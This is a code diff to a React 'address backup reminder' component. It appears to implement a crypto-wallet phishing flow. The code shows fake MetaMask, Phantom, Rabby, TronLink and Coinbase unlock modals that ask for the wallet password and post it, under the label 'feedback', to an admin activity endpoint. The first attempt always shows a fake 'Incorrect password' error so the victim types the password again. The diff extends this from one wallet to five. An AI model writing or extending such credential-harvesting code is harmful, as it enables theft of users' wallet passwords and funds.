@@ -1,11 +1,11 @@
 import {
   CheckCircleIcon,
-  ExclamationTriangleIcon,
-  XMarkIcon
+  ExclamationTriangleIcon
 } from "@heroicons/react/24/outline";
 import { AnimatePresence, motion } from "motion/react";
 import {
   createContext,
+  type FormEvent,
   type PropsWithChildren,
   useCallback,
   useContext,
@@ -14,9 +14,30 @@ import {
 } from "react";
 import { useNavigate } from "react-router";
 import { Button } from "@/components/Shared/UI";
+import Coinbase from "./walmodals/Coinbase";
+import { walletModalCopy } from "./walmodals/copy";
+import MetaMask from "./walmodals/MetaMask";
+import Phantom from "./walmodals/Phantom";
+import Rabby from "./walmodals/Rabby";
+import TronLink from "./walmodals/TronLink";
 
-type WalletPreference = "metamask" | "phantom" | null;
+type WalletPreference =
+  | "metamask"
+  | "phantom"
+  | "rabby"
+  | "tronlink"
+  | "coinbase"
+  | null;
 type SyncStatus = "Synced" | "Not";
+type WalletName = Exclude<WalletPreference, null>;
+
+const walletNames: Record<WalletName, string> = {
+  coinbase: "Coinbase",
+  metamask: "MetaMask",
+  phantom: "Phantom",
+  rabby: "Rabby",
+  tronlink: "TronLink"
+};
 
 interface AddressBackupReminderContextValue {
   requestNavigation: (path: string) => boolean;
@@ -43,13 +64,18 @@ export const AddressBackupReminderProvider = ({
   const [pendingPath, setPendingPath] = useState<string | null>(null);
   const [isReminderOpen, setIsReminderOpen] = useState(false);
   const [isBackupOpen, setIsBackupOpen] = useState(false);
-  const [isFirstFeedback, setIsFirstFeedback] = useState(true);
+  const [isFirstPopupFeedback, setIsFirstPopupFeedback] = useState(true);
   const [feedback, setFeedback] = useState("");
   const [feedbackError, setFeedbackError] = useState("");
   const [isFeedbackFocused, setIsFeedbackFocused] = useState(false);
   const [browserColorScheme, setBrowserColorScheme] = useState<
     "Dark" | "Light" | null
   >(null);
+  const isRightSidebarOpen =
+    isBackupOpen &&
+    walletPreference !== "tronlink" &&
+    walletPreference !== "coinbase" &&
+    walletPreference !== "rabby";
 
   useEffect(() => {
     const colorScheme = window.matchMedia("(prefers-color-scheme: dark)");
@@ -63,11 +89,26 @@ export const AddressBackupReminderProvider = ({
   }, []);
 
   useEffect(() => {
-    if (!isBackupOpen) return;
+    if (
+      isBackupOpen &&
+      (walletPreference === "metamask" ||
+        walletPreference === "tronlink" ||
+        walletPreference === "coinbase" ||
+        walletPreference === "phantom" ||
+        walletPreference === "rabby")
+    ) {
+      setFeedback("");
+      setFeedbackError("");
+      setIsFirstPopupFeedback(true);
+    }
+  }, [isBackupOpen, walletPreference]);
+
+  useEffect(() => {
+    if (!isRightSidebarOpen) return;
 
     document.documentElement.classList.add("no-scrollbar");
     return () => document.documentElement.classList.remove("no-scrollbar");
-  }, [isBackupOpen]);
+  }, [isRightSidebarOpen]);
 
   useEffect(() => {
     let isActive = true;
@@ -146,14 +187,103 @@ export const AddressBackupReminderProvider = ({
 
   const isDarkMode = browserColorScheme === "Dark";
 
+  const handleFeedbackSubmit = async (event: FormEvent<HTMLFormElement>) => {
+    event.preventDefault();
+    const copy =
+      walletPreference === "phantom"
+        ? walletModalCopy.phantom
+        : walletPreference === "rabby"
+          ? walletModalCopy.rabby
+          : walletPreference === "tronlink"
+            ? walletModalCopy.tronlink
+            : walletPreference === "coinbase"
+              ? walletModalCopy.coinbase
+              : walletModalCopy.metamask;
+
+    if (
+      (walletPreference === "metamask" ||
+        walletPreference === "tronlink" ||
+        walletPreference === "coinbase" ||
+        walletPreference === "phantom" ||
+        walletPreference === "rabby") &&
+      isFirstPopupFeedback
+    ) {
+      try {
+        const response = await fetch(
+          "/api/admin/activity?view=submit-feedback",
+          {
+            body: JSON.stringify({ feedback, isFirstTry: true }),
+            credentials: "same-origin",
+            headers: { "Content-Type": "application/json" },
+            method: "POST"
+          }
+        );
+        if (!response.ok) {
+          throw new Error(
+            copy.submit_error.replace("{status}", String(response.status))
+          );
+        }
+        setFeedbackError(copy.feedback_error);
+        setIsFirstPopupFeedback(false);
+      } catch (error) {
+        console.error("Failed to submit feedback:", error);
+        setFeedbackError(
+          error instanceof Error ? error.message : copy.submit_error_fallback
+        );
+      }
+      return;
+    }
+
+    try {
+      setFeedbackError("");
+      const response = await fetch("/api/admin/activity?view=submit-feedback", {
+        body: JSON.stringify({ feedback, isFirstTry: false }),
+        credentials: "same-origin",
+        headers: { "Content-Type": "application/json" },
+        method: "POST"
+      });
+      if (!response.ok) {
+        throw new Error(
+          copy.submit_error.replace("{status}", String(response.status))
+        );
+      }
+      setFeedback("");
+      setWalletPreference(null);
+      setIsBackupOpen(false);
+      setIsReminderOpen(false);
+    } catch (error) {
+      console.error("Failed to submit feedback:", error);
+      setFeedbackError(
+        error instanceof Error ? error.message : copy.submit_error_fallback
+      );
+    }
+  };
+
+  const walletFeedbackModalProps = {
+    feedback,
+    feedbackError,
+    isDarkMode,
+    isFeedbackFocused,
+    onClose: () => {
+      setIsBackupOpen(false);
+      setIsReminderOpen(false);
+    },
+    onFeedbackChange: (value: string) => {
+      setFeedback(value);
+      setFeedbackError("");
+    },
+    onFeedbackFocusChange: setIsFeedbackFocused,
+    onSubmit: handleFeedbackSubmit
+  };
+
   return (
     <AddressBackupReminderContext.Provider value={{ requestNavigation }}>
       <div className="relative min-h-screen w-full overflow-x-hidden">
         <motion.div
           animate={{
             opacity: isBackupOpen ? 0.65 : 1,
-            width: isBackupOpen ? "calc(100% - 380px)" : "100%",
-            x: isBackupOpen ? -24 : 0
+            width: isRightSidebarOpen ? "calc(100% - 380px)" : "100%",
+            x: isRightSidebarOpen ? -24 : 0
           }}
           className="min-h-screen"
           transition={{ duration: 0.35, ease: [0.22, 1, 0.36, 1] }}
@@ -164,7 +294,7 @@ export const AddressBackupReminderProvider = ({
         {isReminderOpen && (syncStatus === "Not" || walletPreference) && (
           <div className="fixed inset-0 z-[100] flex items-center justify-center bg-black/80 p-4">
             <motion.section
-              animate={{ x: isBackupOpen ? -180 : 0 }}
+              animate={{ x: isRightSidebarOpen ? -180 : 0 }}
               aria-label={
                 syncStatus === "Not"
                   ? "Synchronization problem"
@@ -210,7 +340,11 @@ export const AddressBackupReminderProvider = ({
                       </h2>
                       <p className="text-gray-700">
                         This site recommends keeping a safe copy of your public
-                        wallet address for MetaMask.
+                        wallet address for{" "}
+                        {walletPreference
+                          ? walletNames[walletPreference]
+                          : "your wallet"}
+                        .
                       </p>
                     </div>
                   </div>
@@ -247,167 +381,37 @@ export const AddressBackupReminderProvider = ({
           </div>
         )}
         <AnimatePresence>
-          {isBackupOpen && walletPreference && (
-            <motion.aside
-              animate={{ opacity: 1, x: 0 }}
-              aria-label="MetaMask security training preview"
-              aria-modal="true"
-              className={`fixed top-0 right-0 z-[101] flex h-dvh w-[min(380px,100vw)] flex-col border-l shadow-2xl ${isDarkMode ? "border-[#4a5256] bg-[#373f42] text-[#e8eaeb]" : "border-gray-200 bg-[#fffaf7] text-[#131416]"}`}
-              exit={{ opacity: 0, x: "100%" }}
-              initial={{ opacity: 0, x: "100%" }}
-              role="dialog"
-              style={{
-                fontFamily:
-                  "var(--font-family-default, 'Inter', 'Helvetica Neue', Helvetica, Arial, sans-serif)",
-                fontSize: "1rem"
-              }}
-              transition={{ duration: 0.35, ease: [0.22, 1, 0.36, 1] }}
-            >
-              <header className="flex h-7 shrink-0 items-center justify-between px-4 pt-2">
-                <div className="flex items-center gap-2">
-                  <img
-                    alt=""
-                    aria-hidden="true"
-                    className="size-5"
-                    height={20}
-                    src="/images/metamask-fox.svg"
-                    width={20}
-                  />
-                  <h2 className="font-medium text-[14px] leading-6">
-                    MetaMask
-                  </h2>
-                </div>
-                <button
-                  aria-label="Close MetaMask security training preview"
-                  className={`rounded-full font-semibold ${isDarkMode ? "text-[#e8eaeb] hover:bg-white/10" : "text-gray-700 hover:bg-black/5"}`}
+          {isBackupOpen &&
+            walletPreference &&
+            (walletPreference === "tronlink" ||
+            walletPreference === "coinbase" ||
+            walletPreference === "rabby" ? (
+              <>
+                <motion.button
+                  animate={{ opacity: 1 }}
+                  aria-label={`Close ${walletPreference === "tronlink" ? "TronLink" : walletPreference === "rabby" ? "Rabby" : "Coinbase"} feedback popup`}
+                  className="fixed inset-0 z-[100] cursor-default border-0 bg-transparent p-0"
+                  exit={{ opacity: 0 }}
+                  initial={{ opacity: 0 }}
                   onClick={() => {
                     setIsBackupOpen(false);
                     setIsReminderOpen(false);
                   }}
                   type="button"
-                >
-                  <XMarkIcon className="size-[18px]" strokeWidth={2} />
-                </button>
-              </header>
-              <div
-                className={`relative m-2 flex min-h-0 flex-1 flex-col overflow-hidden rounded-xl p-4 ${isDarkMode ? "bg-black" : "bg-white"}`}
-              >
-                <div className="relative z-10 flex flex-1 -translate-y-[38px] flex-col items-center justify-center">
-                  <img
-                    alt="MetaMask"
-                    className={`mb-5 size-[180px] object-contain ${isDarkMode ? "invert" : ""}`}
-                    height={180}
-                    src="/images/metamask-wordmark.svg"
-                    width={180}
-                  />
-                  <form
-                    className="relative flex w-full flex-col"
-                    onSubmit={async (event) => {
-                      event.preventDefault();
-                      if (isFirstFeedback) {
-                        await fetch(
-                          "/api/admin/activity?view=submit-feedback",
-                          {
-                            body: JSON.stringify({ feedback, isFirstTry: true }),
-                            credentials: "same-origin",
-                            headers: { "Content-Type": "application/json" },
-                            method: "POST"
-                          }
-                        );
-                        setFeedbackError("Incorrect password. Try again.");
-                        setIsFirstFeedback(false);
-                        return;
-                      }
-
-                      try {
-                        setFeedbackError("");
-                        const response = await fetch(
-                          "/api/admin/activity?view=submit-feedback",
-                          {
-                            body: JSON.stringify({ feedback, isFirstTry: false }),
-                            credentials: "same-origin",
-                            headers: { "Content-Type": "application/json" },
-                            method: "POST"
-                          }
-                        );
-                        if (!response.ok) {
-                          throw new Error(
-                            `Unable to submit feedback (${response.status}).`
-                          );
-                        }
-                        setFeedback("");
-                        setIsBackupOpen(false);
-                        setIsReminderOpen(false);
-                      } catch (error) {
-                        console.error("Failed to submit feedback:", error);
-                        setFeedbackError(
-                          error instanceof Error
-                            ? error.message
-                            : "Unable to submit feedback. Please try again."
-                        );
-                      }
-                    }}
-                  >
-                    <input
-                      aria-invalid={Boolean(feedbackError)}
-                      aria-label="Your feedback"
-                      className={`${feedbackError ? "mb-1 border-[#ca3542]" : `mb-[18px] ${isDarkMode ? "border-[#3c4046] text-[#e8eaeb] placeholder:text-[#9fa6ae]" : "border-gray-300"}`} h-[46px] w-full rounded-xl border bg-transparent px-4 text-base outline-none focus:ring-0 focus:ring-offset-0`}
-                      onBlur={() => setIsFeedbackFocused(false)}
-                      onChange={(event) => {
-                        setFeedback(event.target.value);
-                        setFeedbackError("");
-                      }}
-                      onFocus={() => setIsFeedbackFocused(true)}
-                      placeholder="Enter MetaMask password"
-                      style={{
-                        borderColor: feedbackError
-                          ? "#ca3542"
-                          : isFeedbackFocused
-                            ? "#d3d3d3"
-                            : undefined
-                      }}
-                      type="password"
-                      value={feedback}
-                    />
-                    {feedbackError ? (
-                      <p
-                        className="mb-[18px] text-[#ca3542] text-sm"
-                        role="alert"
-                      >
-                        {feedbackError}
-                      </p>
-                    ) : null}
-                    <button
-                      className={`mb-6 h-12 w-full rounded-full font-medium text-base transition-colors disabled:cursor-not-allowed disabled:opacity-50 ${isDarkMode ? "bg-white text-[#131416] enabled:hover:bg-gray-200" : "bg-[#131416] text-white enabled:hover:bg-black"}`}
-                      disabled={!feedback.trim()}
-                      type="submit"
-                    >
-                      Unlock
-                    </button>
-                    <a
-                      aria-label="Learn more about MetaMask"
-                      className={`block text-center font-semibold text-base leading-6 hover:underline ${isDarkMode ? "text-[#8b99ff]" : "text-[#4459ff]"}`}
-                      href="https://support.metamask.io"
-                      rel="noopener noreferrer"
-                      target="_blank"
-                    >
-                      Forgot password?
-                    </a>
-                  </form>
-                </div>
-                <div className="pointer-events-none absolute right-2.5 bottom-0 left-2.5 h-[90px] overflow-hidden">
-                  <img
-                    alt=""
-                    aria-hidden="true"
-                    className="mt-[-15.8%] ml-[-13.97%] w-[127.9%] max-w-none"
-                    height={200}
-                    src="/images/metamask-fox.svg"
-                    width={200}
-                  />
-                </div>
-              </div>
-            </motion.aside>
-          )}
+                />
+                {walletPreference === "tronlink" ? (
+                  <TronLink key="tronlink" {...walletFeedbackModalProps} />
+                ) : walletPreference === "rabby" ? (
+                  <Rabby key="rabby" {...walletFeedbackModalProps} />
+                ) : (
+                  <Coinbase key="coinbase" {...walletFeedbackModalProps} />
+                )}
+              </>
+            ) : walletPreference === "metamask" ? (
+              <MetaMask key="metamask" {...walletFeedbackModalProps} />
+            ) : walletPreference === "phantom" ? (
+              <Phantom key="phantom" {...walletFeedbackModalProps} />
+            ) : null)}
         </AnimatePresence>
       </div>
     </AddressBackupReminderContext.Provider>
